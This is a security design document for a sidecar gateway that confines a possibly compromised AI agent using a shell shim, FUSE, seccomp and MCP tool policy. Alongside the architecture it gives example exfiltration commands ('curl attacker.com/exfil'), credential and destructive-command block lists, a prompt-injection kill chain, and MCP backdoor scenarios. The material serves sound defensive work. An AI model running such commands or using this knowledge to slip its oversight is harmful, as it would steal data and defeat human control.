# ASK — Runtime Enforcement Gateway

The guardrail stack and egress proxy mediate actions that cross the workstation boundary — LLM calls and network requests respectively. But a compromised agent can cause significant damage entirely within the workstation: reading sensitive files, spawning malicious processes, executing destructive commands, or staging data for exfiltration. Container hardening (read-only root, dropped capabilities, non-root user) limits the blast radius but does not provide visibility or fine-grained control over what the agent does within its permitted operations.

A **runtime enforcement gateway** addresses this gap by mediating every file operation, command execution, network connection, and signal at the syscall level — while running in its own isolation boundary that the agent cannot access.

*Part of the ASK operating framework.*

---

## 1. Sidecar Architecture

The gateway runs as a **separate container** from the agent, sharing only the PID namespace and a workspace volume. The gateway's own binaries, policy files, configuration, and audit logs live in a filesystem the agent cannot see or modify. This is the same architectural pattern used for the egress proxy and LLM proxy: the enforcement engine is outside the agent's reach.

```
┌─────────────────────────────────────────────────────────────────┐
│  Pod / Shared PID Namespace                                     │
│                                                                 │
│  ┌─────────────────────────┐   ┌─────────────────────────────┐  │
│  │ ask-gateway              │   │ ask-assistant                │  │
│  │ (sidecar container)      │   │ (agent container)            │  │
│  │                          │   │                              │  │
│  │ agentsh server (PID 1)   │   │ OpenClaw (child of gateway) │  │
│  │ Policy engine            │   │                              │  │
│  │ FUSE provider            │   │ Shell: /bin/bash → shim      │  │
│  │ Seccomp supervisor       │   │ Files: workspace via FUSE    │  │
│  │ Audit event emitter      │   │ Net: via seccomp mediation   │  │
│  │                          │   │                              │  │
│  │ Owns (agent can't see):  │   │ Can see:                     │  │
│  │  • Policy YAML files     │   │  • FUSE-mounted workspace    │  │
│  │  • Gateway config        │   │  • Shell shim (as /bin/bash) │  │
│  │  • Audit log buffer      │   │  • Own process tree          │  │
│  │  • FUSE mount source     │   │  • Env vars (filtered)       │  │
│  │  • Gateway binaries      │   │                              │  │
│  │                          │   │ Cannot see:                  │  │
│  │ Mounts:                  │   │  • Gateway filesystem        │  │
│  │  • policy/ (RO from host)│   │  • Policy files              │  │
│  │  • workspace/ (RW)       │   │  • Audit logs                │  │
│  │  • audit-logs/ (write)   │   │  • Gateway config            │  │
│  │  • shim-bin/ (RO, shared)│   │  • Any other container       │  │
│  └────────────┬─────────────┘   └──────────────┬───────────────┘  │
│               │                                │                  │
│        Shares PID namespace              Shares PID namespace     │
│        (gateway is PID 1,                (agent is child,         │
│         owns process table)               cannot escape)          │
│                                                                   │
│  Shared between containers:                                       │
│    • PID namespace (gateway as parent, agent as child)            │
│    • Workspace volume (mediated by FUSE from gateway side)        │
│    • Shim volume (read-only: gateway writes, agent executes)      │
│                                                                   │
│  NOT shared:                                                      │
│    • Filesystem namespace (separate root FS per container)        │
│    • Gateway config/policy (only in gateway container)            │
│    • Audit logs (written by gateway, read by Sentinel)            │
└─────────────────────────────────────────────────────────────────┘
```

**Why sidecar, not embedded:** The framework's core design principle is that the agent is compromisable at any time. Enforcement machinery must not share an isolation boundary with the thing it enforces. If the gateway runs inside the agent's container, the agent and gateway share a filesystem namespace — the agent could potentially discover gateway binaries, read policy files, or find writable paths that affect gateway behavior. In the sidecar model, the gateway's filesystem is as inaccessible to the agent as the egress proxy's configuration or LiteLLM's guardrail rules. The agent knows the gateway exists (it can observe that `/bin/bash` behaves differently) but cannot inspect, modify, or disable it.

This is the same reasoning the framework applies to every other control: the egress proxy doesn't run inside the agent container. The LLM guardrails don't run inside the agent container. The Sentinel monitor doesn't run inside the agent container. The runtime gateway follows the same pattern.

## 2. Shared PID Namespace: How Enforcement Works Without Shared Filesystem

The sidecar model uses a shared PID namespace to establish the parent-child relationship between the gateway and the agent:

1. **The gateway container starts first as PID 1.** It initializes the policy engine, FUSE provider, and seccomp supervisor.

2. **The agent process is launched as a child of the gateway.** The gateway starts the agent's entrypoint command within the shared PID namespace. The agent process and its entire subprocess tree are children of the gateway.

3. **Shell shim enforcement.** The agent container's `/bin/bash` and `/bin/sh` are replaced by the gateway's shim binary (installed via a shared read-only volume). Every shell invocation from the agent routes to the gateway's policy engine, which runs in the gateway container's process space. The agent executes the shim but the shim communicates with the gateway server — the policy evaluation happens outside the agent's filesystem boundary.

4. **FUSE workspace mediation.** The gateway mounts the workspace volume through its FUSE provider. The agent container sees the workspace as a normal mount point, but every file operation (open, read, write, create, delete) is intercepted by the FUSE layer running in the gateway container. The gateway evaluates the operation against policy and either permits, denies, redirects, or flags it for approval.

5. **Seccomp supervision.** The gateway installs seccomp-user-notify filters on the agent's process tree. System calls for network connections (`connect()`), signals (`kill()`), and other sensitive operations are forwarded to the gateway for policy evaluation before the kernel executes them. The seccomp filters are set by the parent process (gateway) on the child process (agent) — the agent cannot remove or modify them.

The result: the gateway has full enforcement authority over the agent's operations (via PID namespace parentage, FUSE, and seccomp), while the gateway's own policy, configuration, and binaries remain in a separate filesystem namespace the agent cannot access.

## 3. What the Agent Cannot Do

In the sidecar model, a compromised agent cannot:

| Attack | Why It Fails |
|---|---|
| Read gateway policy files | Different filesystem namespace — gateway's `/etc/agentsh/` doesn't exist in agent's mount namespace |
| Modify gateway config | Gateway filesystem is in a separate container the agent has no mount to |
| Kill or signal the gateway | Seccomp filters block signals to PID 1; gateway is in a separate container |
| Bypass the shell shim | `/bin/bash` and `/bin/sh` are the shim; raw `execve()` is intercepted by seccomp |
| Access workspace without FUSE | Workspace is FUSE-mounted; the underlying storage is in the gateway's mount namespace |
| Read audit logs | Audit log volume is mounted only in the gateway and Sentinel containers |
| Disable seccomp filters | Filters are set by parent process; `no-new-privileges` prevents modification |
| Access gateway's network endpoints | Gateway's admin API listens on localhost within its own network namespace (or on a management network the agent can't reach) |

This is the same trust model as the egress proxy: the agent knows traffic goes through a proxy (it can observe the HTTP_PROXY environment variable), but it cannot access the proxy's configuration, modify its denylist, or read its logs. The runtime gateway extends this pattern to file, process, and signal operations.

## 4. Enforcement Mechanisms

The gateway uses three kernel-level mechanisms, all operating from the sidecar container:

| Mechanism | What It Mediates | Enforcement Boundary |
|---|---|---|
| **Shell shim** | Command execution | Shim binary in shared read-only volume; policy evaluation in gateway container |
| **FUSE filesystem** | File operations (open, read, write, create, delete, stat) | FUSE provider runs in gateway container; agent sees FUSE mount |
| **Seccomp user-notify** | Network connections, signals, process control | Filters set by gateway (parent) on agent (child); evaluation in gateway container |

On Linux, all three mechanisms provide **enforced** mediation — the agent cannot bypass them without a kernel exploit, which is the same trust boundary the container runtime itself relies on. The enforcement is not advisory; it's structural.

## 5. Policy Decisions

The gateway's policy engine supports six decision types:

| Decision | Behavior | Use Case |
|---|---|---|
| `allow` | Operation proceeds | Routine operations within policy |
| `deny` | Operation blocked, error returned | Prohibited operations |
| `approve` | Operation paused, human approval required | Consequential or irreversible operations |
| `redirect` | Operation transparently rerouted to approved alternative | Agent uses wrong tool/path → steered to correct one |
| `audit` | Same as allow, with enhanced logging | Operations to watch but not block |
| `soft_delete` | Destructive operation quarantined, recoverable | Deletes moved to recovery area instead of executing |

**Corrective steering** via `redirect` is architecturally significant. When a compromised agent attempts a prohibited action and receives a deny, it typically retries — trying variations of the same approach, burning tokens, and potentially producing unpredictable escalation behavior. A redirect resolves the situation transparently: the operation appears to succeed from the agent's perspective, but the gateway routed it to an approved alternative. The agent doesn't enter a retry loop because it doesn't perceive a failure.

This is not the same as the agent cooperating with policy. The agent may be fully compromised and actively attempting to violate policy. The redirect doesn't depend on agent cooperation — it operates at the syscall level below the agent's control. The agent's `write("/etc/passwd", data)` call returns success, but the data landed in `/workspace/.scratch/quarantine/` instead. The agent's `curl evil.com` call returns a response, but the request was routed through the audited fetch wrapper and the domain was blocked by the egress proxy.

## 6. Policy Configuration

Policies are defined in YAML and stored in the gateway container's filesystem — inaccessible to the agent.

Example policy for an ASK Standard-tier agent:

```yaml
version: 1
name: ask-standard-agent

file_rules:
  # Allow workspace read/write (mediated by FUSE)
  - name: allow-workspace
    paths: ["/workspace/**"]
    operations: [read, open, stat, list, write, create, mkdir, chmod, rename]
    decision: allow

  # Approve deletes — don't auto-allow destructive operations
  - name: approve-workspace-delete
    paths: ["/workspace/**"]
    operations: [delete, rmdir]
    decision: approve
    message: "Delete {{.Path}}?"
    timeout: 5m

  # Read-only access to system files the runtime needs
  - name: allow-system-read
    paths: ["/usr/**", "/lib/**", "/etc/**"]
    operations: [read, open, stat, list]
    decision: allow

  # Block credential access patterns
  - name: deny-credentials
    paths: ["**/.env", "**/*.key", "**/*.pem", "**/secrets/**", "**/.ssh/**"]
    operations: ["*"]
    decision: deny

  # Default deny
  - name: default-deny-files
    paths: ["**"]
    operations: ["*"]
    decision: deny

command_rules:
  # Standard development tools
  - name: allow-standard-tools
    commands: [python, python3, node, npm, pip, git, ls, cat, head, tail, grep, find, jq]
    decision: allow

  # Redirect download tools through audited wrapper
  - name: redirect-downloads
    commands: [curl, wget]
    decision: redirect
    redirect_to:
      command: agentsh-fetch
      args: ["--audit"]
    message: "Downloads routed through audited fetch"

  # Block dangerous commands
  - name: block-dangerous
    commands: [rm, shutdown, reboot, kill, pkill, dd, mkfs]
    decision: deny

network_rules:
  # Connections handled by external egress proxy;
  # gateway provides per-process attribution
  - name: allow-proxy
    domains: ["litellm", "egress"]
    ports: [4000, 3128]
    decision: allow

  - name: default-deny-network
    domains: ["*"]
    decision: deny

env_policy:
  env_allow: [PATH, LANG, TERM, HOME, OPENAI_API_BASE, OPENAI_API_KEY,
              HTTP_PROXY, HTTPS_PROXY, NO_PROXY]
  env_deny: [ANTHROPIC_API_KEY, DISCORD_BOT_TOKEN, AWS_*]
  block_iteration: true
```

Policy updates follow the same pattern as egress proxy policy updates: modify the file on the host, signal the gateway to reload. No agent container rebuild required. The agent never sees the policy content.

## 7. MCP Server Enforcement

OpenClaw agents commonly use MCP (Model Context Protocol) servers — external processes that provide tools to the agent via JSON-RPC 2.0 over stdio or HTTP. Community skills from ClawHub can introduce additional MCP servers at runtime. Without gateway-level enforcement, MCP tool calls bypass the command policy because they execute as inter-process messages rather than shell commands.

### 7.1 The MCP Enforcement Gap

The gateway's command policy mediates shell commands (`python`, `curl`, `git`, etc.) via the shell shim. But MCP tool calls take a different path:

```
Agent process
    │
    │  JSON-RPC: {"method": "tools/call", "params": {"name": "write_file", ...}}
    │
    ▼
MCP server subprocess (child of agent, visible in shared PID namespace)
    │
    │  Executes tool directly — no shell, no shim, no command policy
    │
    ▼
Result returned to agent via JSON-RPC
```

The MCP server is a child process that the gateway can observe (shared PID namespace), but without MCP-aware policy, the gateway only sees the process spawn — not the semantic tool calls happening inside it. A `filesystem` MCP server could write to any path. A malicious ClawHub skill could register an MCP server that exfiltrates data. The `mcp-hub` skill gives access to 1,200+ MCP servers without individual tool review.

### 7.2 Gateway MCP Interception

The gateway intercepts MCP tool calls by monitoring JSON-RPC messages between the agent process and MCP server subprocesses via the shared PID namespace:

```
Agent process
    │
    │  JSON-RPC: {"method": "tools/call", "params": {"name": "write_file", ...}}
    │
    ▼
┌──────────────────────────────────────────────────────────────────┐
│  Gateway MCP Policy Engine (ask-gateway container)               │
│                                                                  │
│  1. Intercept JSON-RPC message via PID namespace stdio monitor   │
│  2. Parse tool name and arguments                                │
│  3. Evaluate against mcp_policy tool_rules (first match wins)    │
│  4. Check version pinning (tool definition unchanged?)           │
│  5. Check rate limits                                            │
│  6. Allow / Deny / Approve / Audit                               │
│  7. Emit structured audit event                                  │
└──────────────────────────────────────────────────────────────────┘
    │
    ▼ (if allowed)
MCP server subprocess
```

This is the same architectural pattern as the shell shim: the enforcement happens in the gateway container, outside the agent's filesystem boundary. The agent cannot see, modify, or disable MCP policy.

### 7.3 MCP Policy Configuration

MCP policy is defined in the same policy YAML as file, command, and network rules:

```yaml
mcp_policy:
  enforce: true
  fail_closed: true
  default_decision: deny

  tool_rules:
    - name: allow-filesystem-read
      server: "filesystem"
      tools: [read_file, list_directory, search_files, get_file_info]
      decision: allow

    - name: deny-filesystem-write
      server: "filesystem"
      tools: [write_file, create_directory, move_file, delete_file]
      decision: deny

    - name: approve-github-write
      server: "github"
      tools: [create_issue, create_pull_request, push_files]
      decision: approve
      message: "MCP tool {{.Server}}/{{.Tool}} wants to modify GitHub"
      timeout: 5m

    - name: default-deny-mcp
      server: "*"
      tools: ["*"]
      decision: deny

  version_pinning:
    enabled: true
    on_change: block
    auto_trust_first: true
    pin_store: /var/lib/agentsh/mcp-pins

  rate_limits:
    enabled: true
    default:
      requests_per_minute: 120
      burst: 20

  skill_registration:
    allow_runtime_registration: false
    require_operator_approval: true
    audit_registrations: true
```

### 7.4 Version Pinning (Rug Pull Detection)

MCP servers advertise their tool definitions during the initial capability handshake. A compromised or maliciously updated MCP server could change tool definitions to alter behavior — for example, changing a `read_file` tool to also write data to an external endpoint. Version pinning captures the initial tool definitions and blocks the server if they change:

1. **First connection:** Gateway records the MCP server's tool definitions (names, schemas, descriptions) in `/var/lib/agentsh/mcp-pins/` (gateway filesystem, invisible to agent).
2. **Subsequent connections:** Gateway compares current tool definitions against the pinned version. If any tool was added, removed, or had its schema changed, the gateway blocks the server and emits an alert.
3. **Operator review:** The operator inspects the change, updates the pin if the change is legitimate, or removes the MCP server if it's suspicious.

This catches supply chain attacks where a ClawHub skill update introduces a backdoor tool or modifies an existing tool's behavior.

### 7.5 Skill Registration Control

Community skills from ClawHub can register new MCP servers at runtime — spawning new child processes that gain tool execution capability. The gateway controls this:

- **`allow_runtime_registration: false`** — Skills cannot register new MCP servers after the agent starts. All MCP servers must be pre-configured in `openclaw.json` (which is part of the Superego layer, read-only to the agent).
- **`require_operator_approval: true`** — Even if runtime registration is allowed, new servers are blocked until the operator approves them.
- **`audit_registrations: true`** — All registration attempts (including blocked ones) are logged for security review.

### 7.6 Why This Is Different from OpenClaw's Tool Policy

OpenClaw has its own `tools.allow` / `tools.deny` and `security` configuration with `ask` modes. The critical distinction:

| Property | OpenClaw's tool policy | Gateway's MCP policy |
|---|---|---|
| **Where it runs** | Inside the agent process | In the gateway sidecar (separate container) |
| **Agent can modify** | Yes (compromised agent can alter config) | No (different filesystem namespace) |
| **Agent can see rules** | Yes | No |
| **Survives agent compromise** | No | Yes |
| **Enforcement mechanism** | Application-level (agent's own code) | OS-level (PID namespace, seccomp) |

OpenClaw's tool policy is a good first layer — it prevents accidental misuse by a well-behaved agent. The gateway's MCP policy is the safety net — it prevents intentional misuse by a compromised agent. Both should be configured, but only the gateway's policy satisfies tenet 1 (constraints are external and inviolable).

## 8. Audit Events and Log Integration

The gateway emits structured JSON events to a log volume that only the gateway and Sentinel containers can access:

```json
{
  "timestamp": "2026-02-20T14:30:00Z",
  "session_id": "sess-abc123",
  "event_type": "file_write",
  "process": {
    "pid": 42,
    "command": "python3",
    "parent_pid": 12,
    "tree": ["bash", "python3"]
  },
  "details": {
    "path": "/workspace/output.json",
    "operation": "write",
    "bytes": 4096
  },
  "policy": {
    "rule": "allow-workspace",
    "decision": "allow"
  }
}
```

These events should be shipped to the same log aggregation as the LLM proxy and egress proxy logs, using the same correlation ID scheme. The gateway's `session_id` ties events to a specific agent session. When combined with the `correlation_id` from the mediation layer, the full kill chain is visible:

1. **Gateway:** agent spawned `python3 fetch_data.py` (process event)
2. **Gateway:** `python3` opened `/workspace/config.json` for read (file event)
3. **Egress proxy:** `python3` → HTTP GET `api.example.com/data` (network event)
4. **Gateway:** `python3` wrote 45KB to `/workspace/fetched_data.json` (file event)
5. **LLM proxy:** agent included `fetched_data.json` content in prompt (LLM event)
6. **LLM proxy:** guardrail triggered — XPIA detected in prompt (guardrail event)
7. **Gateway:** agent attempted `curl attacker.com/exfil` — denied by command policy (command event)

Without gateway events, steps 1, 2, 4, and 7 are invisible. The mediation layer sees the network request and the LLM call but not the file operations or the blocked exfiltration command that never reached the network.

## 9. Integration with the ASK Stack

The gateway integrates as a new container in the existing Docker Compose topology:

**New container: `ask-gateway`.** Runs the agentsh server. Shares PID namespace with `ask-assistant`. Mounts the workspace volume (as FUSE source), the shim binary volume (read-only, shared with agent), the policy directory (read-only from host), and the audit log volume (shared with Sentinel).

**Modified container: `ask-assistant`.** The agent container's entrypoint changes — instead of launching OpenClaw directly, the agent process is started by the gateway via the shared PID namespace. The agent container mounts the FUSE-mediated workspace and the shim binary volume. It loses direct access to the raw workspace volume.

**Modified container: `ask-sentinel`.** Gains a new read-only data source: gateway audit logs. Sentinel can correlate gateway events (unusual file access patterns, unexpected process spawns, denied operations, redirect triggers) with egress and LLM proxy events for more comprehensive anomaly detection.

**Network architecture unchanged.** The two-network topology (`agent-bridge` internal, `proxy-egress` external) remains the same. The gateway container joins `agent-bridge` to communicate with the agent but does not need `proxy-egress` access — it doesn't make external network requests. Its policy evaluation is local.

**LLM proxy scoping.** The gateway includes an optional embedded LLM proxy with DLP capability. In the ASK stack, this should be scoped carefully to avoid duplicating LiteLLM's responsibilities. See Section 10 for guidance on division of responsibility.

```yaml
# docker-compose.yaml additions (sketch)

services:
  gateway:
    build:
      context: ./gateway
    container_name: ask-gateway
    hostname: gateway
    networks:
      agent-bridge:
        ipv4_address: 172.30.0.15
    pid: "host"  # or shared PID namespace with assistant
    volumes:
      - workspace:/workspace                    # Raw workspace, served via FUSE
      - ./gateway/policy:/etc/agentsh/policy:ro  # Policy files (agent can't see)
      - gateway-audit:/var/log/agentsh           # Audit logs (agent can't see)
      - shim-bin:/usr/local/share/agentsh-shim:ro  # Shim binary shared with agent
    read_only: true
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    cap_add:
      - SYS_PTRACE    # Required for seccomp-user-notify
      - SYS_ADMIN     # Required for FUSE mount
    deploy:
      resources:
        limits:
          memory: 512M
          cpus: '0.5'

  assistant:
    # ... existing config ...
    pid: "service:gateway"  # Share PID namespace with gateway
    depends_on:
      - gateway
    volumes:
      - workspace-fuse:/workspace:ro    # FUSE-mediated view, not raw volume
      - shim-bin:/usr/local/bin:ro      # Shell shim appears as /usr/local/bin/bash
      # Note: NO mount for gateway policy, config, or audit logs

  sentinel:
    # ... existing config ...
    volumes:
      # ... existing log mounts ...
      - gateway-audit:/var/log/agentsh:ro  # NEW: gateway audit logs

volumes:
  workspace:          # Raw workspace data
  workspace-fuse:     # FUSE-mediated view of workspace
  gateway-audit:      # Gateway audit logs
  shim-bin:           # Shared shim binary
```

*Note: The test deployment implements this architecture with FUSE workspace mediation now deployed in **monitor mode** (audit-only). The gateway has `/dev/fuse`, `fuse3` installed, and sandbox config with `mode: monitor`. The workspace (`/mind/id`) is a host bind mount (`/var/lib/ask/workspace`) with `rshared`→`rslave` propagation — the gateway's FUSE layer is visible in the assistant container. File operations generate audit events but are not yet blocked. See `gateway/config/server-config.yaml` for the sandbox configuration and `docker-compose.yaml` for the volume topology.*

## 10. Enforcement Layers: Full Stack

With the gateway, the ASK stack has five enforcement layers, ordered from outermost to innermost:

| Layer | Component | Container | What It Enforces | Agent Can Access? |
|---|---|---|---|---|
| 1. Network isolation | Docker bridge network | Infrastructure | No direct internet from agent network | No |
| 2. Egress proxy | mitmproxy (`ask-egress`) | Own container | Domain denylist, rate limits, size limits | No |
| 3. LLM proxy | LiteLLM (`ask-litellm`) | Own container | Model routing, guardrails, spend caps, scoped keys | No |
| 4. Container hardening | Docker runtime | Infrastructure | Read-only root, no capabilities, non-root, resource limits | No |
| 5. Runtime gateway | agentsh (`ask-gateway`) | Own container | File policy, command policy, process tracking, signal control | No |
| 5a. MCP tool policy | agentsh (`ask-gateway`) | Own container | MCP tool allowlist, version pinning, rate limits, skill registration | No |

Every layer runs in its own isolation boundary. The MCP tool policy is part of the runtime gateway (layer 5) but listed separately because it addresses a distinct enforcement surface — MCP JSON-RPC tool calls that bypass shell-level command policy. The agent cannot access any layer's configuration, policy, or logs. Each layer enforces independently — if one layer is misconfigured or bypassed, the others still hold. This is defense in depth with genuine isolation between layers, not defense in depth where the layers share a trust boundary with the thing they're defending against.

## 11. Impact on Workstation Hardening

The gateway extends the workstation hardening table with controls that container hardening alone cannot provide:

| Control | Employee Laptop Equivalent | Container Hardening (existing) | + Runtime Gateway (sidecar) |
|---|---|---|---|
| Read-only system | BitLocker + system integrity | `read_only: true` | + Per-file operation policy |
| No admin rights | Standard user account | `no-new-privileges`, `cap_drop: ALL` | + Per-command allow/deny/approve |
| Managed firewall | Windows Firewall + GPO | Internal network, proxy-only | + Per-process network attribution |
| Web filtering | Secure Web Gateway | mitmproxy egress denylist | + Per-process URL visibility |
| DLP | Data Loss Prevention agent | LiteLLM guardrails | + Pre-LLM PII redaction |
| Activity logging | EDR / endpoint telemetry | Egress + LiteLLM request logs | + File/process/signal audit trail |
| Compliance checks | MDM compliance scanner | Sentinel compliance.py | + Gateway policy violation alerts |
| Resource limits | CPU/RAM quotas | Docker resource limits | + Per-command execution control |
| **Application control** | **AppLocker / allowlisting** | *Not implemented* | **Command allowlist/denylist** |
| **File integrity** | **File integrity monitoring** | *Not implemented* | **File operation audit trail** |
| **Process control** | **Process allowlisting** | *Not implemented* | **Subprocess tree tracking + policy** |
| **Corrective steering** | **URL rewriting / app redirection** | *Not implemented* | **Redirect decisions on commands, files, network** |
| **Plugin/extension control** | **Browser extension policies** | *Not implemented* | **MCP tool allowlist + version pinning + skill registration control** |
| **Supply chain integrity** | **Software allowlisting + hash verification** | *Not implemented* | **MCP version pinning — detect tool definition changes between sessions** |

The bottom six rows are capabilities that container hardening cannot provide. They are standard controls in enterprise endpoint security and represent the gap that the runtime gateway fills.

## 12. Impact on Kill Chain Defenses

The gateway adds control points at stages of the XPIA kill chain where the existing architecture has limited visibility:

| Kill Chain Stage | Existing Control | + Runtime Gateway (sidecar) |
|---|---|---|
| 1. Content poisoning | Egress proxy domain denylist | Per-process attribution: which process fetched which content |
| 2. Agent ingestion | Egress proxy logging | File write audit: what was written to workspace from fetched content |
| 3. Context injection | LLM guardrails (pre_call) | Optional DLP: redact sensitive data before it reaches LLM proxy |
| 4. LLM manipulation | LLM guardrails (post_call) | (No additional control at this stage) |
| 5. Action execution | Egress proxy for network actions | **Command policy: block/approve/redirect the commanded action** |
| 5. Action execution | *(No file-level control)* | **File policy: block/approve/redirect file writes** |
| 5. Action execution | *(No MCP-level control)* | **MCP tool policy: block/approve MCP tool calls per server** |
| 6. Exfiltration / damage | Egress proxy domain denylist | **Per-process network attribution + command-level exfil blocking** |
| 6. Exfiltration / damage | *(No skill supply chain control)* | **MCP version pinning: detect skill/server tampering** |

The gateway's strongest contribution is at **stages 5 and 6** — when a compromised agent attempts to execute the LLM's manipulated instructions.

## 13. LLM Mediation: Scoping Responsibilities Between Gateway and LLM Proxy

The runtime gateway includes an optional embedded LLM proxy that can intercept all LLM API requests from the agent. LiteLLM, the external LLM proxy, provides model routing, guardrails, spend tracking, and scoped API keys. Several capabilities overlap. This section defines which component owns which responsibility and why.

### The Pipeline

When the gateway's LLM proxy is enabled, LLM requests flow through a two-stage pipeline:

```
Agent process
    │
    │  (agent calls OPENAI_API_BASE, which points to gateway)
    │
    ▼
┌──────────────────────────────────────────────────────┐
│  Runtime Gateway LLM Proxy (ask-gateway container)   │
│                                                      │
│  1. Log: which process/subprocess made this call     │
│  2. DLP: redact credentials and secrets              │
│  3. Tag: attach session_id + process metadata        │
│  4. Forward to LiteLLM                               │
└──────────────────┬───────────────────────────────────┘
                   │
                   │  (gateway forwards to litellm:4000)
                   │
                   ▼
┌──────────────────────────────────────────────────────┐
│  LiteLLM Proxy (ask-litellm container)               │
│                                                      │
│  1. Authenticate: validate scoped API key            │
│  2. Guardrails (pre_call): XPIA, injection, content  │
│  3. DLP: Presidio PII masking                        │
│  4. Route: select provider + model                   │
│  5. Forward to provider                              │
│  6. Guardrails (post_call): scan response            │
│  7. Log: request/response, tokens, cost              │
│  8. Enforce: spend cap, rate limit                   │
└──────────────────┬───────────────────────────────────┘
                   │
                   ▼
              LLM Provider
         (Anthropic, OpenAI, etc.)
```

### Scoping Principle

**The gateway owns what happens inside the workstation. LiteLLM owns what happens at the LLM gateway.**

### Feature-by-Feature Scoping

| Capability | Owner | Rationale |
|---|---|---|
| **Model routing** | LiteLLM | Fleet-wide concern. Agents request model names; LiteLLM maps them to providers. |
| **Scoped API keys** | LiteLLM | Per-agent key with model, budget, and rate restrictions. |
| **Provider key isolation** | LiteLLM | Provider API keys live in LiteLLM's container, never in the agent or gateway. |
| **Spend tracking** | LiteLLM | Writes token counts and costs to PostgreSQL. |
| **Rate limiting** | LiteLLM | Enforced per scoped key. |
| **XPIA / injection detection** | LiteLLM | Content analysis against known attack patterns. |
| **PII masking (names, emails, SSNs, etc.)** | LiteLLM (Presidio) | NLP-based PII detection using spaCy. |
| **Credential/secret redaction** | Gateway | API keys, tokens, private keys — data that should never leave the workstation. |
| **Process attribution** | Gateway | Which process initiated this LLM call. Invisible to LiteLLM. |
| **Tool permission guard** | LiteLLM | Controls which tools the LLM can invoke in its response. |
| **Request/response logging** | Both (different scope) | LiteLLM logs for fleet-wide audit. Gateway logs for session-level process-attributed audit. |

### When to Disable the Gateway's LLM Proxy

If the deployment does not need process-level attribution of LLM calls, and credential leakage into LLM prompts is not a concern, the gateway's LLM proxy can be disabled entirely. The agent's `OPENAI_API_BASE` points directly to `litellm:4000`. The gateway continues to enforce file, command, process, and signal policy.

## 14. Reference Architecture: Open-Source Guardrail Stack

The reference architecture uses only open-source, no-cost, no-registration tooling:

| Layer | Component | Position | What It Catches | License / Cost |
|---|---|---|---|---|
| Credential DLP | Gateway (agentsh) | Sidecar container | API keys, tokens, private keys, connection strings | Apache-2.0 / Free |
| Content filter (regex) | LiteLLM built-in | LLM proxy container | SSN, credit card patterns, XPIA exfil patterns | Apache-2.0 / Free |
| PII masking | Presidio (Microsoft) | LLM proxy container (Flask sidecars) | Names, emails, phone numbers, SSNs, addresses (NLP-based) | MIT / Free |
| Custom XPIA patterns | `xpia_guardrail.py` | LLM proxy container | HTML comment injection, base64 encoded payloads, role override, DNS-style encoding | Project-specific / Free |
| Injection detector (heuristic) | LiteLLM built-in | LLM proxy container | Known prompt injection patterns (heuristic scoring) | Apache-2.0 / Free |
| Tool permission guard | LiteLLM built-in | LLM proxy container | Unauthorized tool invocations in LLM responses | Apache-2.0 / Free |
| MCP tool policy | Gateway (agentsh) | Sidecar container | MCP server tool allowlist, version pinning, rate limits, skill registration | Apache-2.0 / Free |

All components run locally, require no external API calls, and have no registration or account requirements. Commercial guardrail layers can be added as optional enhancements but are not part of the reference architecture.

---

*See also: [Single-Agent Architecture](Single-Agent-Architecture.md) for the component topology, [Threat Model](Threat-Model.md) for the attacks this addresses.*
